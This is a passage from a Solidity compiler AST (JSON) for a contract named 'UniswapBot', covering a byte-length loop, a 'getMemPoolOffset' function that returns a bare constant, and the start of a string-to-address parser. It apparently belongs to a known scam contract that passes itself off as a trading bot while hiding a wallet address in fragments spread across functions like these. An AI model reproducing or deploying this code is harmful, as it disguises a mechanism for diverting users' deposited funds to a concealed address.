																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 650,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7694:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 626,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7709:3:0",
																	"valueSize": 1
																}
															],
															"id": 652,
															"nodeType": "InlineAssembly",
															"src": "7683:39:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																},
																"id": 655,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 653,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 650,
																	"src": "7740:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 654,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7744:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7740:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"id": 663,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 661,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 650,
																		"src": "7802:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784530",
																		"id": 662,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7806:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_224_by_1",
																			"typeString": "int_const 224"
																		},
																		"value": "0xE0"
																	},
																	"src": "7802:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 671,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 669,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 650,
																			"src": "7864:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30784630",
																			"id": 670,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7868:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_240_by_1",
																				"typeString": "int_const 240"
																			},
																			"value": "0xF0"
																		},
																		"src": "7864:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": {
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 679,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 677,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 650,
																				"src": "7926:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30784638",
																				"id": 678,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7930:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_248_by_1",
																					"typeString": "int_const 248"
																				},
																				"value": "0xF8"
																			},
																			"src": "7926:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": {
																			"condition": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 687,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 685,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 650,
																					"src": "7988:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30784643",
																					"id": 686,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7992:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_252_by_1",
																						"typeString": "int_const 252"
																					},
																					"value": "0xFC"
																				},
																				"src": "7988:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			},
																			"falseBody": {
																				"id": 697,
																				"nodeType": "Block",
																				"src": "8047:43:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 695,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 693,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 626,
																								"src": "8066:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "36",
																								"id": 694,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8073:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_6_by_1",
																									"typeString": "int_const 6"
																								},
																								"value": "6"
																							},
																							"src": "8066:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 696,
																						"nodeType": "ExpressionStatement",
																						"src": "8066:8:0"
																					}
																				]
																			},
																			"id": 698,
																			"nodeType": "IfStatement",
																			"src": "7985:105:0",
																			"trueBody": {
																				"id": 692,
																				"nodeType": "Block",
																				"src": "7998:43:0",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 690,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 688,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 626,
																								"src": "8017:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "35",
																								"id": 689,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8024:1:0",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_5_by_1",
																									"typeString": "int_const 5"
																								},
																								"value": "5"
																							},
																							"src": "8017:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 691,
																						"nodeType": "ExpressionStatement",
																						"src": "8017:8:0"
																					}
																				]
																			}
																		},
																		"id": 699,
																		"nodeType": "IfStatement",
																		"src": "7923:167:0",
																		"trueBody": {
																			"id": 684,
																			"nodeType": "Block",
																			"src": "7936:43:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 682,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 680,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 626,
																							"src": "7955:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "34",
																							"id": 681,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "7962:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_4_by_1",
																								"typeString": "int_const 4"
																							},
																							"value": "4"
																						},
																						"src": "7955:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 683,
																					"nodeType": "ExpressionStatement",
																					"src": "7955:8:0"
																				}
																			]
																		}
																	},
																	"id": 700,
																	"nodeType": "IfStatement",
																	"src": "7861:229:0",
																	"trueBody": {
																		"id": 676,
																		"nodeType": "Block",
																		"src": "7874:43:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 674,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 672,
																						"name": "ptr",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 626,
																						"src": "7893:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "+=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "33",
																						"id": 673,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "7900:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_3_by_1",
																							"typeString": "int_const 3"
																						},
																						"value": "3"
																					},
																					"src": "7893:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 675,
																				"nodeType": "ExpressionStatement",
																				"src": "7893:8:0"
																			}
																		]
																	}
																},
																"id": 701,
																"nodeType": "IfStatement",
																"src": "7799:291:0",
																"trueBody": {
																	"id": 668,
																	"nodeType": "Block",
																	"src": "7812:43:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 666,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 664,
																					"name": "ptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 626,
																					"src": "7831:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "+=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 665,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7838:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "7831:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 667,
																			"nodeType": "ExpressionStatement",
																			"src": "7831:8:0"
																		}
																	]
																}
															},
															"id": 702,
															"nodeType": "IfStatement",
															"src": "7736:354:0",
															"trueBody": {
																"id": 660,
																"nodeType": "Block",
																"src": "7750:43:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 658,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 656,
																				"name": "ptr",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 626,
																				"src": "7769:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "+=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 657,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7776:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "7769:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 659,
																		"nodeType": "ExpressionStatement",
																		"src": "7769:8:0"
																	}
																]
															}
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 645,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 643,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 626,
														"src": "7630:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 644,
														"name": "end",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 633,
														"src": "7636:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7630:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 704,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 641,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 639,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "7623:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 640,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7627:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "7623:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 642,
													"nodeType": "ExpressionStatement",
													"src": "7623:5:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 647,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7641:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 646,
															"name": "l",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 623,
															"src": "7641:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 648,
													"nodeType": "ExpressionStatement",
													"src": "7641:3:0"
												},
												"nodeType": "ForStatement",
												"src": "7618:483:0"
											}
										]
									},
									"documentation": null,
									"id": 706,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "calcLiquidityInContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 621,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 620,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 706,
												"src": "7484:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 619,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 24,
													"src": "7484:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$24_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7483:19:0"
									},
									"returnParameters": {
										"id": 624,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 623,
												"mutability": "mutable",
												"name": "l",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 706,
												"src": "7526:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 622,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "7526:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7525:8:0"
									},
									"scope": 1578,
									"src": "7451:657:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 713,
										"nodeType": "Block",
										"src": "8173:34:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3739313037373934",
													"id": 711,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8191:8:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_79107794_by_1",
														"typeString": "int_const 79107794"
													},
													"value": "79107794"
												},
												"functionReturnParameters": 710,
												"id": 712,
												"nodeType": "Return",
												"src": "8184:15:0"
											}
										]
									},
									"documentation": null,
									"id": 714,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolOffset",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 707,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "8141:2:0"
									},
									"returnParameters": {
										"id": 710,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 709,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 714,
												"src": "8167:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 708,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "8167:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "8166:6:0"
									},
									"scope": 1578,
									"src": "8116:91:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 889,
										"nodeType": "Block",
										"src": "8462:859:0",
										"statements": [
											{
												"assignments": [
													722
												],
												"declarations": [
													{
														"constant": false,
														"id": 722,
														"mutability": "mutable",
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 889,
														"src": "8473:16:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 721,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8473:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 727,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 725,
															"name": "_a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 716,
															"src": "8498:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 724,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "8492:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 723,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "8492:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 726,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8492:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8473:28:0"
											},
											{
												"assignments": [
													729
												],
												"declarations": [
													{
														"constant": false,
														"id": 729,
														"mutability": "mutable",
														"name": "iaddr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 889,
														"src": "8512:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 728,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8512:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 731,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30",
													"id": 730,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "8528:1:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_0_by_1",
														"typeString": "int_const 0"
													},
													"value": "0"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "8512:17:0"
											},
											{
												"assignments": [
													733
												],
												"declarations": [
													{
														"constant": false,
														"id": 733,
														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 889,
														"src": "8540:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 732,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8540:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 734,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8540:10:0"
											},
											{
												"assignments": [
													736
												],
												"declarations": [
													{
														"constant": false,
														"id": 736,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 889,
														"src": "8561:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 735,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8561:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 737,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8561:10:0"
											},
											{
												"body": {
													"id": 882,
													"nodeType": "Block",
													"src": "8625:657:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 755,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 753,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 729,
																	"src": "8640:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 754,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8649:3:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "8640:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 756,
															"nodeType": "ExpressionStatement",
															"src": "8640:12:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 767,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 757,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "8667:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 762,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 722,
																						"src": "8686:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 764,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 763,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 739,
																						"src": "8690:1:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8686:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 761,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8680:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 760,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8680:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 765,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8680:13:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 759,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8672:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 758,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8672:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
